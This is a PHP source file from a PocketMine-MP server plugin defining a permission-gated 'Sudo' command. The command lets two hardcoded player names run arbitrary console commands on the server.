<?php

declare(strict_types=1);

namespace NgLamVN\GameHandle\command;

use CortexPE\Commando\args\TextArgument;
use CortexPE\Commando\exception\ArgumentOrderException;
use pocketmine\command\CommandSender;
use pocketmine\console\ConsoleCommandSender;
use pocketmine\player\Player;
use pocketmine\Server;

class Sudo extends BaseCommand{
	/**
	 * @throws ArgumentOrderException
	 */
	protected function prepare() : void{
		$this->setDescription("Run command as console");
		$this->setPermission("gh.sudo");

		$this->registerArgument(0, new TextArgument("command"));
	}

	public function onRun(CommandSender $sender, string $aliasUsed, array $args) : void{
		if ($sender instanceof Player){
			if (!in_array($sender->getName(), ["JINODK", "NgLamVN"], true)){
				$sender->sendMessage("No u !");
				return;
			}
		}
		$cmd = $args["command"];
		Server::getInstance()->dispatchCommand(new ConsoleCommandSender(Server::getInstance(), Server::getInstance()->getLanguage()), $cmd);
	}
}
